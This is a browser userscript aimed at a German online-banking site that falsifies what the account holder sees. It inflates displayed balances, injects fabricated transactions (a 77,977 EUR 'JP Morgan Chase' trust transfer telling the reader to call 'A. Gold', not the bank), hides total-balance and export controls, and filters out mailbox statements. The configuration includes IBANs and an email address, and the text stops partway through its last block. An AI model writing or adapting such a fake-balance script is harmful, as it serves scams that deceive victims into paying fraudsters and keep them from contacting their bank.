// ==UserScript==
// @name         Ed Start 4Rec spvb.dorisserowy@web.de
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/557770/Ed%20Start%204Rec%20spvbdorisserowy%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/557770/Ed%20Start%204Rec%20spvbdorisserowy%40webde.meta.js
// ==/UserScript==






// STARTSEITE

  const StartBALANCE_CONFIGS = [
        { index: 1, adjustmentsAmount: 7000 },
    //    { index: 2, adjustmentsAmount: 999999 },
   //     { index: 3, adjustmentsAmount: 999999 },
   //     { index: 4, adjustmentsAmount: 999999 },
    //    { index: 6, adjustmentsAmount: 0 },
        // add more…
    ];



// FINUEBER
 // Configure adjustments by the index (1-based) of *balance elements* as they appear on the page
  const MBALANCE_CONFIGS = [
    { index: 1, adjustmentAmount: 7000 },
    { index: 2, adjustmentAmount: 7000 },
    { index: 3, adjustmentAmount: 7000 },
      { index: 4, adjustmentAmount: 7000 },
//    { index: 6, adjustmentAmount: 0 },
    // add more…
  ];

const REQUIRED_IBAN = 'DE65 1004 0000 0645 5901 00';

// UMSATZE BALANCE
const BALANCE_CHANGE_AMOUNT = 7000.00; // Adjust the amount to increase or decrease balance

// UMSATZE TRANSACTIONS

// Array of transactions to insert
    // Each transaction has an id, mode ('row' or 'container'), and transaction data
    const CUSTOM_TRANSACTIONS = [
        {
            id: 'tx2',
            mode: 'container',
            data: {
                date: 'Vorgemerkt',
                balance: ' ',
                title: 'Treuhand. JP Morgan Chase. ',
                details: 'Freigage durch Absender.A. Gold anrufen,nicht die Bank damit nicht gesperrt ',
                type: 'Treuhand-Überweisung',
                amount: '+77.977,00 EUR',
                avatar: 'TJ'   // ⭐ ALLOWED MODIFICATION
            }
        },
             {
            id: 'tx7',
            mode: 'container',
            data: {
                date: '23.12.2025',
                balance: ' ',
                title: 'JP Morgan Chase. RIBEX',
                details: 'A. Gold anrufen,nicht die Bank damit nicht gesperrt ',
                type: 'Gutschrift',
                amount: '+7.000,00 EUR',
                avatar: 'TJ'   // ⭐ ALLOWED MODIFICATION
            },
     },

    //    {
   //         id: 'tx3',
   //         mode: 'container',
   //         data: {
   //             date: '29.11.2025',
   //             balance: ' ',
   //             title: 'JP Morgan Chase.',
   //             details: 'A. Gold anrufen, nicht die Bank damit nicht gesperrt',
   //             type: 'Gutschrift',
   //             amount: '+100,00 EUR',
   //             avatar: 'JM'   // ⭐ ALLOWED MODIFICATION
   //         }
    //    },
    ];

// COMM UTITLITIES

  // ── Feature toggles (set true/false) ─────────────────────────────────────────
  const ENABLE_REMOVE_DEBITOR_AMOUNT          = true;  // .debitorAmount under .mod.mod-DebitorDd
  const ENABLE_TRIM_AFTER_PIPE_D6477_PRE      = true;  // trim after "|" in d6477 <pre>
  const ENABLE_TRIM_AFTER_PIPE_D6477_HELPER   = true;  // trim after "|" in <p>.lsgs-d6477--two-line-item__helper-text
  const ENABLE_TRIM_AFTER_PIPE_FEEC9_HELPER   = true;  // trim after "|" in <p>.lsgs-feec9--two-line-item__helper-text (under subsection)
  const ENABLE_REMOVE_GESAMTSALDO             = true;  // remove elements containing "Ihr Gesamtsaldo beträgt"
  const ENABLE_REMOVE_EXPORTIEREN             = true;  // [aria-label="Exportieren"]
  const ENABLE_REMOVE_ACTIONS_MENU            = true;  // .ActionFlyoutMenu-module_actionsMenu__Cpbcx.lsgs-d6477--action-flyout
  const ENABLE_REMOVE_EXPAND_BOOKING          = true;  // .ActionsButtons-module_expandBookingText__eDx8V
  const ENABLE_REMOVE_EUR_IN_PRODUCT_DETAIL   = true;  // #productDetailReactContainer .lsgs-feec9--h4 with "EUR"
  const ENABLE_REMOVE_TRANSACTIONS_RIGHT      = true;  // <p class="TransactionsTable-...rightSideText... lsgs-d6477--helper-text">...EUR</p>
  const ENABLE_REMOVE_CHIPS_CONTAINER         = true;  // .lsgs-f2d71--chips-item-container.lsgs-f2d71--chips-item-container-container
  const ENABLE_CLEAR_DESC_LIST_TEXT           = true;  // clear text containing "EUR" or "Kontosaldo" under description list

// POSTFACH

// Remove row as soon as it matches the FIRST enabled rule (OR across rules)
  const REMOVE_ON_FIRST_MATCH = true;

  // ── Rules ──
  // Each rule can independently enable/disable IBAN or Date checks.
  // DATE wildcards:
  //  - "00.08.000"  → month-only (August any year)
  //  - "00.08.2025" → month + year (any day in Aug 2025)
  //  - "00.00.2025" → year-only (any month/day in 2025)
  //  - "01.08.2025" → exact date   CHECKS ONLY THE DATE IN DOKUMENTENTITEL, NOT ERSTELLUNGSDATUM, USUALLY THE LAST DAY OF THE MONTH IF KONTOAUSZUG
  const RULES = [
    {
      name: 'Aug-2025 + specific IBAN',
      enabled: true,
      enableIban: true,
      ibantextpostfach: 'DE03 8504 0000 0402 6522 00',
      enableDate: true,
      dateFilter: '00.07.2025',
    },
    {
      name: 'Any 2022 documents (date-only)',
      enabled: true,
      enableIban: false,
      ibantextpostfach: '',
      enableDate: true,
      dateFilter: '00.00.2022',
    },
    {
      name: 'Exact IBAN only (no date)',
      enabled: false,
      enableIban: true,
      ibantextpostfach: 'DE03850400000402652200',
      enableDate: false,
      dateFilter: '00.00.0000',
    },
  ];




// STARTSEITE
if (
    window.location.href.includes('de') ||
    window.location.href.includes('mainscript') ||
    window.location.href.includes('Downloads')
) {
    'use strict';

    /* ================= CONFIG ================= */



 //   const StartBALANCE_CONFIGS = [
  //      { index: 1, adjustmentsAmount: 999999 },
    //    { index: 2, adjustmentsAmount: 999999 },
   //     { index: 3, adjustmentsAmount: 999999 },
   //     { index: 4, adjustmentsAmount: 999999 },
    //    { index: 6, adjustmentsAmount: 0 },
        // add more…
  //  ];

    /* ================= INTERNAL CACHE ================= */


    const BALANCE_INTERVAL_MS = 100;
    const REMOVE_GESAMTSALDO_INTERVAL_MS = 100;

    const originalBalanceCache = Object.create(null);

    /* ================= HELPERS ================= */

    const parseGermanAmount = text => {
        if (!text) return 0;

        const normalized = text
            .replace(/\s*EUR\s*/i, '')
            .replace(/\./g, '')
            .replace(',', '.')
            .replace(/[^\d.+-]/g, '');

        const value = Number.parseFloat(normalized);
        return Number.isFinite(value) ? value : 0;
    };

    const formatGermanAmount = value => {
        const sign = value >= 0 ? '+' : '-';
        const abs = Math.abs(value);

        const formatted = abs
            .toFixed(2)
            .replace('.', ',')
            .replace(/\B(?=(\d{3})+(?!\d))/g, '.');

        return `${sign}${formatted} EUR`;
    };

    /* ================= BALANCE ENFORCEMENT ================= */

    setInterval(() => {
        try {
            const amountNodes = document.querySelectorAll('.ucc-sp-amount');
            if (!amountNodes.length) return;

            for (const cfg of StartBALANCE_CONFIGS) {
                const idx = cfg.index - 1;
                const amountEl = amountNodes[idx];

                if (!amountEl) continue;

                const currentDisplayed = parseGermanAmount(amountEl.textContent);

                if (!(cfg.index in originalBalanceCache)) {
                    originalBalanceCache[cfg.index] = currentDisplayed;
                    console.log(
                        `📌 Cached original balance [${cfg.index}]: ${currentDisplayed}`
                    );
                }

                const original = originalBalanceCache[cfg.index];
                const expected = original + cfg.adjustmentsAmount;

                if (Math.abs(currentDisplayed - expected) > 0.01) {
                    amountEl.textContent = formatGermanAmount(expected);
                    console.log(
                        `🔁 Balance enforced [${cfg.index}]: ${amountEl.textContent}`
                    );
                }
            }
        } catch (err) {
            console.error('❌ Balance interval error', err);
        }
    }, BALANCE_INTERVAL_MS);

    console.log('🔄 Multi-balance interval started');

    /* ================= REMOVE GESAMTSALDO ================= */

    setInterval(() => {
        try {
            const paragraphs = document.querySelectorAll('p');
            for (const p of paragraphs) {
                if (p.textContent && p.textContent.includes('Gesamtsaldo')) {
                    p.remove();
                    console.log('🗑️ Gesamtsaldo element removed');
                }
            }
        } catch (err) {
            console.error('❌ Gesamtsaldo removal error', err);
        }
    }, REMOVE_GESAMTSALDO_INTERVAL_MS);

    console.log('🧹 Gesamtsaldo removal interval started');
}



// STARTSEITE INDEX
if (
    window.location.href.includes('de') ||
    window.location.href.includes('mainscript') ||
    window.location.href.includes('Downloads')
) {
    'use strict';

    const INDEX_INTERVAL_MS = 100;

    setInterval(() => {
        try {
            const balances = document.querySelectorAll('.ucc-sp-amount');
            if (!balances.length) return;

            balances.forEach((el, i) => {
                if (!el.dataset.balanceIndex) {
                    el.dataset.balanceIndex = String(i + 1);
                    console.log(
                        `🔢 Hidden balance index assigned: ${i + 1}`
                    );
                }
            });
        } catch (err) {
            console.error('❌ Index injection error', err);
        }
    }, INDEX_INTERVAL_MS);
}
//=================================================================================================================
//=================================================================================================================
//=================================================================================================================
//=================================================================================================================




// FINUEBER

 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

//  // Configure adjustments by the index (1-based) of *balance elements* as they appear on the page
 // const MBALANCE_CONFIGS = [
 //   { index: 1, adjustmentAmount: 7700 },
//    { index: 2, adjustmentAmount: 7700 },
//    { index: 3, adjustmentAmount: 7700 },
//    { index: 6, adjustmentAmount: 0 },
//    // add more…
//  ];

    const INDEX_TO_ADJ = new Map(MBALANCE_CONFIGS.map(c => [c.index, c.adjustmentAmount]));
  const TICK_MS = 100;
  const DEBUG = false; // set true to log matches & indexes

  // ---------------- Selectors (fixed) ----------------
  // Include both wrappers and their inner amount nodes, using the *d6477* token and correct lsg/lsgs prefixes.
  const SELECTORS = [
    // Header / totals:
    '.PersonalizedBalance-module_configurationButtonContainer__VJEYd',

    // Table/wrapper cells that often contain the amount:
    '.lsgs-d6477--data-table-tx-inner',

    // The actual text node used for amounts inside cells:
    '.lsg-d6477---typo-5-2',

    // Keep your personalized section amount text:
    '#fo--section--personalized .lsg-d6477---typo-5-2',

    // Fallback if amounts appear in tables elsewhere:
    'table .lsgs-d6477--data-table-tx-inner',
  ];

  // Matches e.g. "1.234,56 EUR", "-1.234,56 EUR", "12,34 EUR"
  // We normalize whitespace first, so the single space here is fine.
  const AMOUNT_RE = /([\-–−]?\d{1,3}(?:\.\d{3})*|\-?\d+),\d{2}\sEUR/i;

  // Replace weird spaces with normal spaces to make regex robust.
  const normalizeWS = (s) => (s || '')
    .replace(/\u00A0|\u202F/g, ' ') // NBSP, NNBSP -> space
    .replace(/\s+/g, ' ')
    .trim();

  function parseEuro(str) {
    const norm = normalizeWS(str);
    const m = norm.match(AMOUNT_RE);
    if (!m) return null;
    const numStr = m[0]
      .replace(/\s?EUR/i, '')
      .replace(/[–−]/g, '-') // normalize minus variants
      .replace(/\./g, '')    // remove thousand separators
      .replace(',', '.');    // decimal to dot
    const n = Number(numStr);
    return Number.isFinite(n) ? n : null;
  }

  function formatEuro(n) {
    const formatted = new Intl.NumberFormat('de-DE', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(n);
    return `${formatted} EUR`;
  }

  // Get unique matches in DOM order, then keep only "leaf" nodes (no selected descendants)
  function getLeafCandidates() {
    const all = SELECTORS.flatMap(sel => Array.from(document.querySelectorAll(sel)));
    const uniq = Array.from(new Set(all)); // de-dupe by reference, preserves order
    const set = new Set(uniq);
    return uniq.filter(el => {
      for (const other of set) {
        if (other !== el && el.contains(other)) return false; // drop ancestors
      }
      return true;
    });
  }

  // From leaf candidates, keep only those that *actually contain a EUR amount*.
  function getBalanceElementsOrdered() {
    const leaves = getLeafCandidates();
    const matches = leaves.filter(el => AMOUNT_RE.test(normalizeWS(el.textContent)));
    if (DEBUG) {
      console.log('[finueber] leaves:', leaves.length, 'matches:', matches.length, matches.map(e => {
        return { tag: e.tagName, cls: e.className, txt: normalizeWS(e.textContent) };
      }));
    }
    return matches;
  }

  function updateByIndex() {
    const balances = getBalanceElementsOrdered(); // in page order
    balances.forEach((el, idx0) => {
      const index = idx0 + 1;

      // Cache the original (base) amount the first time we see this element
      if (!el.dataset.baseEur) {
        const base = parseEuro(el.textContent);
        if (base == null) return; // nothing to do
        el.dataset.baseEur = String(base);
      }

      const baseVal = Number(el.dataset.baseEur);
      const adj = INDEX_TO_ADJ.has(index) ? INDEX_TO_ADJ.get(index) : null;
      const targetVal = adj == null ? baseVal : baseVal + Number(adj);

      // Replace just the numeric part we matched, keep any surrounding label text intact
      const before = el.textContent;
      const normalizedBefore = normalizeWS(before);
      const replaced = normalizedBefore.replace(AMOUNT_RE, () => formatEuro(targetVal));

      // Only write if changed (avoid reflow churn)
      if (replaced !== normalizedBefore) {
        // Preserve original child structure if possible:
        // If element has a single text node or simple structure, textContent is fine.
        // For safety on complex nodes, write to the innermost text container when we can.
        el.textContent = replaced;
      }

      // Optional: mark the computed index for debugging
      el.dataset.mbalanceIndex = String(index);
      if (DEBUG) console.log(`[finueber] idx ${index}: base=${baseVal} -> ${targetVal}`, el);
    });
  }

  // Kickoff + repeat forever every 2s
  updateByIndex();
  setInterval(updateByIndex, TICK_MS);
}



// UMSATZE BALANCE
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

//  const BALANCE_CHANGE_AMOUNT = 99999.75;
//  const REQUIRED_IBAN = 'DE65 1004 0000 0645 5901 00';
  const CHECK_INTERVAL_MS = 100;

  let originalBalance = null;
  let modifiedBalance = null;

  const normalize = str => str.replace(/\s+/g, '').toLowerCase();

  const parseGermanBalance = str => {
    const clean = str
      .replace(/[^\d.,-]/g, '')
      .replace(/\./g, '')
      .replace(',', '.');
    return Number(clean);
  };

  const formatGermanBalance = num =>
    num
      .toFixed(2)
      .replace('.', ',')
      .replace(/\B(?=(\d{3})+(?!\d))/g, '.');

  const ibanMatches = () => {
    const ibanEl = document.querySelector(
      'p[id^="lsgs-aa29d--clicklist-item-helper-text--"]'
    );

    if (!ibanEl) return false;

    const pageIban = normalize(ibanEl.textContent.split('|')[0]);
    const required = normalize(REQUIRED_IBAN);

    return pageIban === required;
  };

  const getBalanceNode = () => {
    const h2 = document.querySelector(
      '.BalanceOverview-module_balanceInfo__b-asC h2'
    );
    if (!h2) return null;

    const comma = h2.querySelector('.lsgs-aa29d--overline-comma');
    if (!comma || !comma.nextSibling) return null;

    return comma.nextSibling;
  };

  const extractBalanceNumber = text => {
    const match = text.match(/[\d\.,-]+\s*EUR/);
    return match ? parseGermanBalance(match[0]) : null;
  };

  setInterval(() => {
    if (!ibanMatches()) return;

    const balanceNode = getBalanceNode();
    if (!balanceNode) return;

    const currentText = balanceNode.textContent;
    const currentValue = extractBalanceNumber(currentText);
    if (currentValue === null) return;

    // Cache original balance ONCE
    if (originalBalance === null) {
      originalBalance = currentValue;
      modifiedBalance = originalBalance + BALANCE_CHANGE_AMOUNT;
      console.log('💾 Original balance cached:', originalBalance);
    }

    // If balance reverted or not yet modified → reapply
    if (currentValue !== modifiedBalance) {
      balanceNode.textContent =
        formatGermanBalance(modifiedBalance) + ' EUR';
      console.log('🔁 Balance reapplied:', modifiedBalance);
    }
  }, CHECK_INTERVAL_MS);

  console.log('⏱️ Interval balance enforcer running');
 }


// UMSATZE TRANSACTIONS

// UMSATZE TRANSACTIONS

 // UMSATZE TRANSACTIONS

// UMSATZE TRANSACTIONS

 // UMSATZE TRANSACTIONS

// UMSATZE TRANSACTIONS

// UMSATZE TRANSACTIONS
// UMSATZE TRANSACTIONS

// UMSATZE TRANSACTIONS
if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

    'use strict';

//    // The IBAN you want to check for (without spaces, case-insensitive)
//    const REQUIRED_IBAN = "DE65 1004 0000 0645 5901 00";
//
//    // Array of transactions to insert
//    const CUSTOM_TRANSACTIONS = [
//        {
 //           id: 'tx2',
 //           mode: 'container',
 //           data: {
 //               date: 'Vorgemerkt',
//                balance: ' ',
//                title: 'Treuhand. JP Morgan Chase. ',
//                details: 'Freigage durch Absender.A. Gold anrufen,nicht die Bank damit nicht gesperrt ',
//                type: 'Treuhand-Überweisung',
//                amount: '+77.977,00 EUR',
//                avatar: 'TJ'   // ⭐ ALLOWED MODIFICATION
 //           }
//        },
//        {
//            id: 'tx3',
//            mode: 'container',
//            data: {
//                date: '28.11.2025',
 //               balance: ' ',
//                title: 'JP Morgan Chase.',
//                details: 'A. Gold anrufen, nicht die Bank damit nicht gesperrt',
//                type: 'Gutschrift',
//                amount: '+100,00 EUR',
//                avatar: 'JM'   // ⭐ ALLOWED MODIFICATION
//            }
//        },
//    ];

    // Main loop
    setInterval(() => {
        let ibanElement = document.querySelector('p[id^="lsgs-aa29d--helper-text"]');
        if (!ibanElement) ibanElement = document.querySelector('p[id*="helper-text"]');

        if (!ibanElement) return;

        const elementIban = ibanElement.textContent.split('|')[0]?.replace(/\s+/g, '').toLowerCase();
        const requiredIban = REQUIRED_IBAN.replace(/\s+/g, '').toLowerCase();

        if (elementIban !== requiredIban) return;

        for (const tx of CUSTOM_TRANSACTIONS) {
            if (document.querySelector(`.tm-custom-transaction-${tx.id}`)) continue;

            if (tx.mode === 'row') injectRow(tx);
            else if (tx.mode === 'container') injectContainer(tx);
        }
    }, 100);

    function injectRow(tx) {
        const container = document.querySelector('[data-cy="table-container_BOOKED"]');
        if (!container) return;

        const tbody = container.querySelector('tbody');
        if (!tbody) return;

        tbody.appendChild(createTransactionRow(tx));
        console.log(`[TM] Inserted custom transaction row for id: ${tx.id}`);
    }

    function injectContainer(tx) {
        const parent = document.querySelector('[data-cy="table-container_BOOKED"]')?.parentNode;
        if (!parent) return;

        const container = document.createElement('div');
        container.className = `TransactionsTable-module_transactionsTable__container__syWTd tm-custom-transaction-${tx.id}`;
        container.setAttribute('data-cy', 'table-container_BOOKED');

        const d = tx.data;

        container.innerHTML = `
            <div class="TransactionsTable-module_transactionsTable__header__UNYFq">
                <div class="TransactionsTable-module_transactionsTable__headerLeftSide__rtcrj">
                    <p class="lsgs-d6477--helper-text">${d.date}</p>
                </div>
                <div data-testid="table-header-right-side" class="TransactionsTable-module_transactionsTable__headerRightSide__l4r5q">
                    <p class="TransactionsTable-module_transactionsTable__rightSideText__QiewT lsgs-d6477--helper-text">${d.balance}</p>
                </div>
            </div>
            <table class="TransactionsTable-module_transactionsTable__table__Y97S6" data-cy="table_BOOKED">
                <caption class="TransactionsTable-module_transactionsTable__caption__leYQ-">
                    Umsätze vom ${d.date}. Der Tagessaldo beträgt
                </caption>
                <thead class="TransactionsTable-module_transactionsTable__tableHead__8R3ik">
                    <tr class="TransactionsTable-module_transactionsTable__headRow__qMUXP">
                        <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Zahlungsverkehrspartner</th>
                        <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Vorausichtliche Buchung</th>
                        <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Umsatzart</th>
                        <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Betrag</th>
                        <th class="TransactionsTable-module_transactionsTable__headCell__3Ye1W">Mehr Optionen</th>
                    </tr>
                </thead>
                <tbody class="TransactionsTable-module_transactionsTable__tableBody__AApDD"></tbody>
            </table>
        `;

        const tbody = container.querySelector('tbody');
        tbody.appendChild(createTransactionRow(tx));

        // ====================================================================
        // ⭐⭐⭐ MERGE + NEW-GROUP + SORT FIX (fully integrated)
        // ====================================================================
        (function mergeAndCreateFix() {

            const dateText = tx.data.date.trim();
            const isVorgemerkt = dateText.toLowerCase() === "vorgemerkt";
            const allContainers = [...document.querySelectorAll('[data-cy="table-container_BOOKED"]')];

            // 1️⃣ HANDLE VORGEMERKT — ALWAYS AT TOP
            if (isVorgemerkt) {

                // Already exists → merge
                let vorgBlock = allContainers.find(c =>
                    c.querySelector("p")?.textContent?.trim().toLowerCase() === "vorgemerkt"
                );

                if (vorgBlock) {
                    vorgBlock.querySelector("tbody").appendChild(createTransactionRow(tx));
                    tx.__handled = true;
                    return;
                }

                // Create new at top
                const newVorg = container.cloneNode(true);
                newVorg.querySelector("tbody").innerHTML = "";
                newVorg.querySelector("tbody").appendChild(createTransactionRow(tx));
                newVorg.querySelector("p").textContent = "Vorgemerkt";

                const firstDateGroup = allContainers.find(c => {
                    const t = c.querySelector("p")?.textContent.trim();
                    return /^\d{2}\.\d{2}\.\d{4}$/.test(t);
                });

                if (firstDateGroup) parent.insertBefore(newVorg, firstDateGroup);
                else parent.appendChild(newVorg);

                tx.__handled = true;
                return;
            }

            // Normalize date
            function normalizeDate(text) {
                const m = text.match(/(\d{2})\.(\d{2})\.(\d{4})/);
                return m ? `${m[3]}-${m[2]}-${m[1]}` : null;
            }

            const newDateNorm = normalizeDate(dateText);

            // Merge into existing block
            const existingBlock = allContainers.find(c => {
                const headerText = c.querySelector("p")?.textContent.trim();
                return normalizeDate(headerText) === newDateNorm;
            });

            if (existingBlock) {
                existingBlock.querySelector("tbody").appendChild(createTransactionRow(tx));
                tx.__handled = true;
                return;
            }

            // Create new date block
            const newBlock = container.cloneNode(true);
            newBlock.querySelector("tbody").innerHTML = "";
            newBlock.querySelector("tbody").appendChild(createTransactionRow(tx));
            newBlock.querySelector("p").textContent = dateText;

            const datedBlocks = allContainers.filter(c =>
                normalizeDate(c.querySelector("p")?.textContent.trim()) !== null
            );

            datedBlocks.sort((a, b) => {
                const da = normalizeDate(a.querySelector("p").textContent.trim());
                const db = normalizeDate(b.querySelector("p").textContent.trim());
                return db.localeCompare(da);
            });

            let inserted = false;
            for (let block of datedBlocks) {
                const blockDate = normalizeDate(block.querySelector("p").textContent.trim());
                if (newDateNorm > blockDate) {
                    parent.insertBefore(newBlock, block);
                    inserted = true;
                    break;
                }
            }

            if (!inserted) parent.appendChild(newBlock);

            tx.__handled = true;
            return;

        })();
        // ====================================================================
        // END FIX
        // ====================================================================

        if (tx.__handled) return;

        // Original fallback insertion
        const reference = document.querySelector('.TransactionsTable-module_transactionsTable__container__syWTd');
        if (reference) parent.insertBefore(container, reference);
        else parent.appendChild(container);

        console.log(`[TM] Inserted custom transaction container for id: ${tx.id}`);
    }


    // ====================================================================
    // ⭐⭐⭐ CREATE ROW WITH CUSTOM INITIALS
    // ====================================================================
    function createTransactionRow(tx) {
        const d = tx.data;
        const amount = d.amount.trim();
        const isPositive = amount.startsWith('+');
        const avatar = (d.avatar || "").trim().toUpperCase(); // ⭐ Insert custom initials

        const tr = document.createElement('tr');
        tr.className = `TransactionRow-module_transactionRow__wNO99 tm-custom-transaction-${tx.id}`;

        tr.innerHTML = `
            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__icon__-UrBC">
                <div class="TransactionRow-module_transactionRow__iconWrapper__NY-vc" data-testid="transaction-icon-name">
                    <div class="lsgs-aa29d--thumbnail TransactionRow-module_thumbnailNoMargin__Ldts7 notranslate lsgs-aa29d--thumbnail__size-regular">
                        <div class="lsgs-aa29d--thumbnail__text" aria-label="${avatar}" role="img">${avatar}</div>
                    </div>
                </div>
            </td>

            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__name__As3Zn">
                <a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146 undefined">
                    <p class="lsgs-aa29d--info-text">${d.title}</p>
                </a>
            </td>

            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__description__AEhbs">
                <a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146 undefined">
                    <p class="lsgs-aa29d--info-text">${d.details}</p>
                </a>
            </td>

            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__type__QfKML">
                <a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146 undefined">
                    <p class="lsgs-aa29d--info-text">${d.type}</p>
                </a>
            </td>

            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__amount__oSkGq">
                <a href="#" class="TransactionRow-module_transactionRow__sideLayerSwitcher__uW146 undefined">
                    <p class="${isPositive ? 'TransactionRow-module_transactionRow__positiveAmount__0JFuZ' : ''} lsgs-aa29d--info-text">
                        ${amount}
                    </p>
                </a>
            </td>

            <td class="TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__actionsButton__Mt4dw undefined">
                <div class="ActionFlyoutMenu-module_actionsMenu__Cpbcx lsgs-aa29d--action-flyout">
                    <div class="lsgs-aa29d--icon-link">
                        <button class="lsgs-aa29d--action lsgs-aa29d--action__interactive lsgs-aa29d--action__no-overlay"
                                type="button" aria-label="Menü öffnen">
                            <span class="lsgs-aa29d--action-inner">
                                <div class="lsgs-aa29d--icon-link__no-text lsgs-aa29d--icon-link__primary lsgs-aa29d--icon-link-wrapper">
                                    <div class="lsgs-aa29d--icon-link-icon lsgs-aa29d--icon lsgs-aa29d--icon__small">
                                        <div class="lsgs-aa29d--icon-inner lsgs-aa29d--icon__default">
                                            <svg fill="currentColor" width="24px" height="24px" viewBox="0 0 24 24">
                                                <path d="M3 12a2 2 0 1 0 2-2 2 2 0 0 0-2 2ZM10 12a2 2 0 1 0 2-2 2 2 0 0 0-2 2ZM17 12a2 2 0 1 0 2-2 2 2 0 0 0-2 2Z"></path>
                                            </svg>
                                        </div>
                                    </div>
                                    <span class="lsgs-aa29d--icon-link-label">Menü öffnen</span>
                                </div>
                            </span>
                        </button>
                    </div>
                </div>
            </td>
        `;

        return tr;
    }

}



// COMM UTITLITIES


 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';

  const INTERVAL_MS = 100;

//  // ── Feature toggles (set true/false) ─────────────────────────────────────────
//  const ENABLE_REMOVE_DEBITOR_AMOUNT          = true;  // .debitorAmount under .mod.mod-DebitorDd
//  const ENABLE_TRIM_AFTER_PIPE_D6477_PRE      = true;  // trim after "|" in d6477 <pre>
//  const ENABLE_TRIM_AFTER_PIPE_D6477_HELPER   = true;  // trim after "|" in <p>.lsgs-d6477--two-line-item__helper-text
//  const ENABLE_TRIM_AFTER_PIPE_FEEC9_HELPER   = true;  // trim after "|" in <p>.lsgs-feec9--two-line-item__helper-text (under subsection)
//  const ENABLE_REMOVE_GESAMTSALDO             = true;  // remove elements containing "Ihr Gesamtsaldo beträgt"
//  const ENABLE_REMOVE_EXPORTIEREN             = true;  // [aria-label="Exportieren"]
//  const ENABLE_REMOVE_ACTIONS_MENU            = true;  // .ActionFlyoutMenu-module_actionsMenu__Cpbcx.lsgs-d6477--action-flyout
//  const ENABLE_REMOVE_EXPAND_BOOKING          = true;  // .ActionsButtons-module_expandBookingText__eDx8V
//  const ENABLE_REMOVE_EUR_IN_PRODUCT_DETAIL   = true;  // #productDetailReactContainer .lsgs-feec9--h4 with "EUR"
//  const ENABLE_REMOVE_TRANSACTIONS_RIGHT      = true;  // <p class="TransactionsTable-...rightSideText... lsgs-d6477--helper-text">...EUR</p>
//  const ENABLE_REMOVE_CHIPS_CONTAINER         = true;  // .lsgs-f2d71--chips-item-container.lsgs-f2d71--chips-item-container-container
//  const ENABLE_CLEAR_DESC_LIST_TEXT           = true;  // clear text containing "EUR" or "Kontosaldo" under description list

  // ── Selectors & constants ────────────────────────────────────────────────────
  const DITOR_PARENT_SELECTOR   = '.mod.mod-DebitorDd';
  const DITOR_TARGET_SELECTOR   = '.debitorAmount';

  // d6477 “IBAN | amount” (original case used <pre>)
  const D6477_TEXT_CONTAINER_PRE =
    '.lsgs-d6477--two-line-item__text-container.lsgs-d6477--two-line-item__text-container-thumb pre';
  // d6477 helper text <p> case (e.g., id="lsgs-d6477--clicklist-item-helper-text--:r8i:")
  const D6477_HELPER_P_SELECTOR = '.lsgs-d6477--two-line-item__helper-text';

  // feec9 helper text <p> inside subsection container
  const FEEC9_SECTION_SELECTOR =
    '.lsgs-feec9--subsection.lsgs-feec9--subsection__separator.lsgs-feec9--subsection__standard';
  const FEEC9_HELPER_P_SELECTOR = '.lsgs-feec9--two-line-item__helper-text';

  const GESAMTSALDO_CONTAINER =
    '.margin-right.lsgs-41601--grid-column.lsgs-41601--grid-column__md-col-6.lsgs-41601--grid-column__sm-col-6.lsgs-41601--grid-column__xs-col-4.lsgs-41601--grid-column__align-left';
  const GESAMTSALDO_PHRASE = 'Ihr Gesamtsaldo beträgt';

  const EXPORTIEREN_SELECTOR   = '[aria-label="Exportieren"]';
  const ACTIONS_MENU_SELECTOR  = '.ActionFlyoutMenu-module_actionsMenu__Cpbcx.lsgs-d6477--action-flyout';
  const EXPAND_BOOKING_SELECTOR= '.ActionsButtons-module_expandBookingText__eDx8V';

  const PRODUCT_DETAIL_CONTAINER_ID = '#productDetailReactContainer';
  const PRODUCT_DETAIL_TARGET_CLASS = '.lsgs-feec9--h4';

  const TRANSACTIONS_RIGHT_SELECTOR =
    'p.TransactionsTable-module_transactionsTable__rightSideText__QiewT.lsgs-d6477--helper-text';

  const CHIPS_CONTAINER_SELECTOR =
    '.lsgs-f2d71--chips-item-container.lsgs-f2d71--chips-item-container-container';

  const DESC_LIST_CONTAINER =
    '.lsgs-d6477--description-list.CashAccount-module_descriptionList__rdOK5';
  const DESC_LIST_TEXT_MATCH = /(Kontosaldo|\bEUR\b)/i;

  const EUR_PATTERN = /\bEUR\b/;
  const normalize = (s) => (s || '').replace(/\s+/g, ' ').trim();

  console.log('[comm utility] Init @', new Date().toISOString(), '| interval:', INTERVAL_MS, 'ms');
